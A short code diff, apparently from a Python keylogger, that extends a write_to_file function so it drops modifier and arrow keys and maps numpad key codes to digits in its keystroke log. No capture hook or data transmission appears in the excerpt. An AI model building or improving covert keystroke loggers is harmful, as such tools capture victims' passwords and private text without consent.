@@ -16,6 +16,47 @@ def write_to_file(key):
             f.write("[BACKSPACE]")
         elif key == 'Key.tab':
             f.write("\t")
+        elif key == 'Key.ctrl_l':
+            f.write("")
+        elif key == 'Key.shift':
+            f.write("")
+        elif key == 'Key.shift_r':
+            f.write("")
+        elif key == 'Key.ctrl_r':
+            f.write("")
+        elif key == 'Key.left':
+            f.write("")
+        elif key == 'Key.up':
+            f.write("")
+        elif key == 'Key.down':
+            f.write("")
+        elif key == 'Key.right':
+            f.write("")
+        elif key == 'Key.ctrl':
+            f.write("")
+
+
+        elif key == '<96>':
+            f.write("0")
+        elif key == '<97>':
+            f.write("1")
+        elif key == '<98>':
+            f.write("2")
+        elif key == '<99>':
+            f.write("3")
+        elif key == '<100>':
+            f.write("4")
+        elif key == '<101>':
+            f.write("5")
+        elif key == '<102>':
+            f.write("6")
+        elif key == '<103>':
+            f.write("7")
+        elif key == '<104>':
+            f.write("8")
+        elif key == '<105>':
+            f.write("9")
+
         else:
             f.write(key)
 
